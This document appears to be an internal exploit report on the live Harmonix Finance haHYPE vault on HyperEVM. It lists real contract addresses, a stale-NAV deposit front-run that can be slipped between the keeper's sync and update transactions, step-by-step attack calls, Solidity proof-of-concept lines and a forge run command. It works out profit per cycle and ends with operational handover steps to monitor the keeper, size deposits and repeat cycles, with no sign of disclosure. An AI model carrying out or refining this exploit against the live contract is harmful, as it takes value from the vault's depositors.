# EX-04 — Harmonix Finance: stale-NAV deposit front-run

**Net for an unprivileged actor:** **$16.31** per 1,000 HYPE in the 60-second keeper window
**Confidence:** MEDIUM — the share-value gain is fork-proven, but cash exit uses the manager-funded withdrawal queue
**Gate:** capital (1,000 HYPE) and the keeper timing window
**Chain:** HyperEVM (999)
**Status:** headline Shieldify C-01 (first-depositor inflation) is not reachable on this live vault; this is a new live path.

## Contracts

| Role | Address |
|---|---|
| FundContract proxy (haHYPE) | `0xFde5B0626fC80E36885e2fA9cD5ad9d7768D725c` |
| Implementation | `0xe35d1c19625d0f72fee2697a4b1b5ab9cf8ac6be` (unverified) |
| Asset (WHYPE) | `0x5555555555555555555555555555555555555555` |
| Fund NAV reader | `0x9E780bf57beD1c7E7aDD2E0A618Fb4aEe3490dBA` |
| Balance contract | `0x543303266113B64d03Ec17B7ec3829f8CddADaC4` |
| Keeper | `0xA3E2e81079bf3d4F708BE4c6A6897e82749424c6` |

Live state at the PoC block: `totalAssets` 14,552.09 HYPE; `totalSupply` 13,886.65 shares; `pricePerShare` 1.049166; TVL ~$1.07M.

## Bug

The keeper publishes the fund NAV with `FundNav.syncPerpDexBalance()` and then calls `FundContract.updateNav()` in a **separate transaction ~60 seconds later**. `deposit`/`depositNativeWithSlippage` mint shares at the last stored `pricePerShare` and never refresh the NAV. A depositor who lands between the sync and the update buys shares at the old, lower price; the update raises the price, and the depositor can lock the gain with `initiateWithdrawal`.

The headline first-depositor attack is not reachable because the vault already has 13,886.65 shares; the specific empty-vault inflation path is blocked.

## Step-by-step

```
observe syncPerpDexBalance tx (FundNav value rises)
depositNativeWithSlippage{value: 1,000 HYPE}(1,000 HYPE, attacker, 0)
// minted at old pricePerShare
keeper calls updateNav() ~60s later -> pricePerShare rises
previewRedeem(shares) > 1,000 HYPE
initiateWithdrawal(shares, 0)  // locks the gain at the post-update price
```

## PoC

`stage3/work/S3-019/Harmonix_Finance_0xFde5B0/poc/src/PoC.t.sol`

Key lines:

```solidity
uint256 shares = vault.depositNativeWithSlippage{value: D}(D, ATTACKER, 0);
vm.prank(KEEPER); vault.updateNav();
uint256 redeemable = vault.previewRedeem(shares);
vm.prank(ATTACKER); vault.initiateWithdrawal(shares, 0);
require(redeemable > D, "no profit");
```

Run:

```bash
cd stage3/work/S3-019/Harmonix_Finance_0xFde5B0/poc
RPC_URL=<hyperevm-rpc> /workspaces/CA/research/tools/foundry/forge test \
  --match-test testStaleNav -vv
```

Expected: 1,000 HYPE deposit mints 955.1058 shares at the old price; after `updateNav`, `previewRedeem` = 1,000.19386 HYPE; net +0.19386 HYPE = $16.31.

## Economics

- Capital: 1,000 HYPE (~$84k at $84.16/HYPE), fully returned at the new NAV; the gain is 0.19386 HYPE.
- Net $16.31 per cycle. Scale is limited by the keeper's NAV move and the vault's liquidity.
- Cash exit is via `initiateWithdrawal` and the manager-funded withdrawal queue, so the gain is locked but not instantly liquid.

## Evidence

- `evidence/getsourcecode.json`, `impl_getsourcecode.json` — proxy/impl.
- `evidence/calls.txt` — `pricePerShare`, `totalAssets`, `totalSupply`, `previewRedeem`.
- `evidence/forge_test_output.txt`, `poc/poc_result.txt` — PoC output.
- `evidence/fundnav_decomp.txt` — `getFundNavValue` behavior.
- Block 48,158,979 sync tx `0xa192dd63…`; update at block 48,159,040 (60s later).

## Risks / caveats

- The keeper window is ~60 seconds; the attacker must monitor `syncPerpDexBalance` and land a deposit before `updateNav`.
- The gain is small and depends on the NAV move; a larger NAV jump or a larger deposit increases it, but the vault's TVL and the withdrawal queue cap the exit.
- MEDIUM confidence because cash redemption is not atomic; the share-value gain is proven.
- If the keeper batches sync+update atomically or deposits refresh the NAV, the path closes.

## Handover

1. Monitor the keeper's `syncPerpDexBalance` and `updateNav` transactions on HyperEVM; confirm the ~60s gap persists.
2. Re-run the PoC at the latest block and recompute the HYPE/USD price.
3. Measure the withdrawal queue depth and the manager's funding; confirm the gain can be redeemed.
4. Size the deposit against the NAV move and the vault's liquidity; check whether multiple cycles are possible.
